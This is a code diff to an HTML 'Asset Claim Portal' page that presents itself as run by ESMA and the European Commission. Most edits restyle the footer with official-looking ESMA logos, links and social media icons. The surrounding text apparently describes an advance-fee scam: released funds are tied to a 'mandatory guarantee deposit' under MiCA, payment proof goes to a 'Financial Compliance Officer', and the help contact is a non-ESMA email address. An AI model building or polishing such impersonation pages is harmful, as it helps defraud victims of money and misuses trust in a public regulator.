@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Asset Claim Portal - ESMA / European Commission</title>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
 
@@ -341,74 +341,105 @@ input[type="text"], input[type="email"], select {
   text-align: left; 
 }
 
-footer {
+/* ESMA Footer Styles */
+.esma-footer {
   background-color: #E2E2EC;
   padding: 40px 10%;
   margin-top: 80px;
-  font-size: 14px;
-  font-family: sans-serif;
-  color: #0055CC;
+  font-family: "Open Sans", Arial, sans-serif;
+  box-sizing: border-box;
 }
 
-.footer-container {
+.footer-content {
   display: flex;
-  align-items: center;
   justify-content: space-between;
-  flex-wrap: wrap;
+  align-items: flex-start;
+  max-width: 1400px;
+  margin: 0 auto;
   gap: 30px;
 }
 
-.footer-left {
+.footer-brand {
   display: flex;
   flex-direction: column;
   align-items: flex-start;
-  gap: 12px;
-  text-align: left;
+  gap: 15px;
 }
 
-.footer-logo img {
-  height: 55px;
+.footer-logo {
+  height: 60px;
   width: auto;
   display: block;
 }
 
-.footer-copyright {
+.eu-banner {
+  background-color: #2A00A0;
+  color: #FFFFFF;
   font-size: 12px;
+  padding: 6px 12px;
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.footer-links {
+  display: grid;
+  grid-template-columns: repeat(3, minmax(140px, auto));
+  column-gap: 50px;
+  row-gap: 25px;
+  align-items: center;
+}
+
+.footer-links a, .footer-links a:visited, .footer-links a:hover, .footer-links a:active {
   color: #0055CC !important;
-  font-family: sans-serif !important;
+  font-size: 15px;
+  font-weight: 400;
+  text-decoration: none !important;
+  white-space: nowrap;
+}
+
+.footer-links a:hover {
+  text-decoration: underline !important;
+}
+
+.footer-social {
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
+
+.social-heading {
+  color: #0055CC;
+  font-size: 16px;
+  font-weight: 700;
   margin: 0;
 }
 
-.footer-links-grid {
-  display: grid;
-  grid-template-columns: repeat(3, minmax(140px, auto));
-  column-gap: 40px;
-  row-gap: 20px;
+.social-icons {
+  display: flex;
+  gap: 12px;
   align-items: center;
-  text-align: center;
-  margin: 0 auto;
 }
 
-footer a, footer a:visited, footer a:hover, footer a:active {
-  color: #0055CC !important;
-  font-family: sans-serif !important;
-  text-decoration: none !important;
-  font-size: 14px;
+.social-icons a {
+  color: #E65100;
+  font-size: 24px;
+  text-decoration: none;
+  transition: opacity 0.2s ease;
 }
 
-@media (max-width: 768px) {
-  .footer-container {
+.social-icons a:hover {
+  opacity: 0.8;
+}
+
+@media (max-width: 900px) {
+  .footer-content {
     flex-direction: column;
-    align-items: center;
+    align-items: flex-start;
   }
-  .footer-left {
-    align-items: center;
-    text-align: center;
-  }
-  .footer-links-grid {
+  .footer-links {
     grid-template-columns: 1fr;
     gap: 15px;
-    margin: 0;
   }
 }
 
@@ -421,7 +452,7 @@ footer a, footer a:visited, footer a:hover, footer a:active {
 }
 
 @media print {
-  .eu-top-banner, .btn-eu, .btn-outline, .lang-select, footer, #langSelect { display: none !important; }
+  .eu-top-banner, .btn-eu, .btn-outline, .lang-select, footer, .esma-footer, #langSelect { display: none !important; }
   body { background: #fff; color: #000; padding: 0; margin: 0; }
   .card { border: none; box-shadow: none; padding: 0; }
   .main-content { max-width: 100%; margin: 0; padding: 0; }
@@ -660,17 +691,22 @@ footer a, footer a:visited, footer a:hover, footer a:active {
   </div>
 </div>
 
-<footer>
-  <div class="footer-container">
-    <div class="footer-left">
-      <div class="footer-logo">
-        <a href="https://www.esma.europa.eu/" target="_blank">
-          <img src="https://www.esma.europa.eu/themes/custom/esma_webst_theme/assets/images/ESMALogo.png" alt="ESMA Official Logo">
-        </a>
+<footer class="esma-footer">
+  <div class="footer-content">
+    
+    <!-- 1. Left side: Logo & Tagline Banner -->
+    <div class="footer-brand">
+      <a href="https://www.esma.europa.eu/" target="_blank">
+        <img src="https://www.esma.europa.eu/themes/custom/esma_webst_theme/assets/images/ESMALogo.png" alt="ESMA Logo" class="footer-logo">
+      </a>
+      <div class="eu-banner">
+        <span>ESMA is an authority of the European Union</span>
+        <span>★</span>
       </div>
-      <p class="footer-copyright">© 2026 European Securities and Markets Authority</p>
     </div>
-    <div class="footer-links-grid">
+
+    <!-- 2. Middle side: 6 Links in 3 Columns -->
+    <div class="footer-links">
       <a href="https://www.esma.europa.eu/about-esma/careers" target="_blank" data-i18n="ftrCareers">Careers</a>
       <a href="mailto:support@mica-ch.info" data-i18n="ftrContact">Contact & Help</a>
       <a href="https://www.esma.europa.eu/cookie-policy" target="_blank" data-i18n="ftrCookie">Cookie Policy</a>
@@ -678,6 +714,18 @@ footer a, footer a:visited, footer a:hover, footer a:active {
       <a href="https://www.esma.europa.eu/interact-with-esma/media-corner" target="_blank" data-i18n="ftrMedia">Media Corner</a>
       <a href="https://www.esma.europa.eu/legal-notice" target="_blank" data-i18n="ftrLegal">Legal Notice</a>
     </div>
+
+    <!-- 3. Right side: Social Media Header & Icons -->
+    <div class="footer-social">
+      <h4 class="social-heading">Social Media</h4>
+      <div class="social-icons">
+        <a href="https://www.linkedin.com/company/european-securities-and-markets-authority-esma/" target="_blank" aria-label="LinkedIn"><i class="fa-brands fa-linkedin"></i></a>
+        <a href="https://instagram.com/esmacomms/" target="_blank" aria-label="Instagram"><i class="fa-brands fa-square-instagram"></i></a>
+        <a href="https://twitter.com/ESMAComms" target="_blank" aria-label="X (Twitter)"><i class="fa-brands fa-square-x-twitter"></i></a>
+        <a href="https://www.youtube.com/channel/UCe5tFtIMPE5BbFGdqT330WQ" target="_blank" aria-label="YouTube"><i class="fa-brands fa-square-youtube"></i></a>
+      </div>
+    </div>
+
   </div>
 </footer>
 
@@ -1389,7 +1437,7 @@ const i18n = {
     modalText: "Jeg anerkner rammeverket <strong>MiCA (Forordning EU 2023/1114)</strong> og forstår at frigivelse av midler strengt er betinget av verifisering av det obligatoriske garantidepositumet.",
     btnModalProceed: "GÅ TIL VERIFISERING",
     dispatchModalTitle: "Innskuddssending Registrert",
-    dispatchModalText: "Vennligst send ditt <strong>Betalingsbevis</strong> (Transaksjonshash / Kvittering) direkte til din dedikerte Financial Compliance Officer for å legge til rette for umiddelbar verifisering og sertifikatutstedelse.",
+    dispatchModalText: "Vennligst send ditt <strong>Betalingsbevis</strong> (Transaktionshash / Kvittering) direkte til din dedikerte Financial Compliance Officer for å legge til rette for umiddelbar verifisering og sertifikatutstedelse.",
     btnDispatchClose: "BEKREFT OG LUKK",
     ftrCareers: "Karrierer",
     ftrContact: "Kontakt & Hjelp",
